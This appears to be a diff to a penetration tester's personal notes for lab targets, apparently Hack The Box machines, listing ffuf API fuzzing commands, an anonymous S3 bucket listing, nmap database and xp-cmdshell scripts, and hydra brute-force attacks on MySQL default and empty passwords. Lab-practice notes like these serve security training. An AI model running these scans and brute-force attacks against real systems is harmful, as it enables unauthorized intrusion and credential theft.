@@ -1,5 +1,75 @@
+http
+====
+
 add https to ffuf
+Receiving spurious errors, exiting
 if 80 443 are available check if 80 is a separate site, a redir or are the same
+
+att auth creds for further http fuzzing (login, pass, token)
 
 add parameter fuzzing to selected pages (like login, or where &id= is possible)
 dump cookies
+
+
+api
+===
+
+restler-fuzzer maybe?
+
+make api fuzzing list from /usr/share/seclists/Discovery/Web-Content/api
+
+# fuzz with no headers
+ffuf -fs 93 -mc all -o ${l}/ffuf-api-noh-${p}.json -t 64 -H "User-Agent: ${ua}" -w /tmp/api-fuzz.lst:FUZZ -u http://${t}:${p}/${api_path}/FUZZ | tee ${l}/ffuf-api-noh-${p}.txt
+
+# fuzz with a generic json payload w/o creds
+ffuf -fs 93 -mc all -X POST -H "Content-Type: application/json" -d '{ "user": "admin" }' -o ${l}/ffuf-api-noh-${p}.json -t 64 -H "User-Agent: ${ua}" -w /tmp/api-fuzz.lst:FUZZ -u http://${t}:${p}/${api_path}/FUZZ | tee ${l}/ffuf-api-noh-${p}.txt
+
+# fuzz with root token
+ffuf -fs 93 -mc all -H "${api_root_token}" -o ${l}/ffuf-api-token-${p}.json -t 64-H "User-Agent: ${ua}" -w /tmp/api-fuzz.lst:FUZZ -u http://${t}:${p}/${api_path}/FUZZ | tee ${l}/ffuf-api-token-${p}.txt
+
+# fuzz with root token and a generic json payload
+ffuf -fs 93 -mc all -H "${api_root_token}" -X POST -H "Content-Type: application/json" -d '{ "user": "admin" }' -o ${l}/ffuf-api-token-${p}.json -t 64-H "User-Agent: ${ua}" -w /tmp/api-fuzz.lst:FUZZ -u http://${t}:${p}/${api_path}/FUZZ | tee ${l}/ffuf-api-token-${p}.txt
+ 
+# fuzz with user token
+ffuf -fs 93 -H "${api_user_token}" -o ${l}/ffuf-api-token-${p}.json -t 64 -H "User-Agent: ${ua}" -w /tmp/api-fuzz.lst:FUZZ -u http://${t}:${p}/${api_path}/FUZZ | tee ${l}/ffuf-api-token-${p}.txt                                                                                                                               
+
+aws
+===
+
+add s3 buckets enum
+
+# unsecure s3 buckets
+aws configure # type dummy data
+aws --endpoint=http://s3.thetoppers.htb s3 ls
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+
+
+mysql db
+========
+
+# find info on mysql/mariadb
+nmap -A -p3306 --script mysql* ${t}
+
+# try passwords
+mysql -u root -h 10.129.14.132
+mysql -u root -pP4SSw0rd -h 10.129.14.128 -P 3306
+
+# mysql
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://10.129.38.174:3306
+
+# mysql empty passwords
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p '' mysql://10.129.38.174:3306
+hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -p '' mysql://10.129.38.174:3306
+
+# find info on db with nmap
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p1433 ${t}
+
+# find info on db with metasploit
+use scanner/mssql/mssql_ping
+set rhosts 10.10.1.10
+run
+
+# try password
+mssqlclient.py Administrator@10.129.201.248 -windows-auth
+hydra? expect?
+
